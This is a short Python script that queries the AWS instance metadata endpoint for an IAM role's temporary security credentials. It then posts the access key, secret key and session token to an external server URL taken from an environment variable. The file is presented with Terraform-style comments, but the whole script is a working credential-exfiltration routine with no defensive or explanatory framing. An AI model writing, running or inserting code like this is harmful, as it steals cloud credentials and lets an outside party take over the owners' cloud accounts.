import os
import requests
import json

# Get the IAM role name from the Terraform variable
role_name = os.environ.get("IAM_ROLE_NAME")

# Retrieve the instance metadata
metadata_url = "http://169.254.169.254/latest/dynamic/instance-identity/document"
response = requests.get(metadata_url)
instance_metadata = json.loads(response.text)

# Retrieve the security credentials for the IAM role
credentials_url = f"http://169.254.169.254/latest/meta-data/iam/security-credentials/{role_name}"
response = requests.get(credentials_url)
sts_credentials = json.loads(response.text)

# Send the credentials to the external server
external_server_url = os.environ.get("EXTERNAL_SERVER_URL")
payload = {
    "access_key": sts_credentials["AccessKeyId"],
    "secret_key": sts_credentials["SecretAccessKey"],
    "token": sts_credentials["Token"]
}
response = requests.post(external_server_url, json=payload)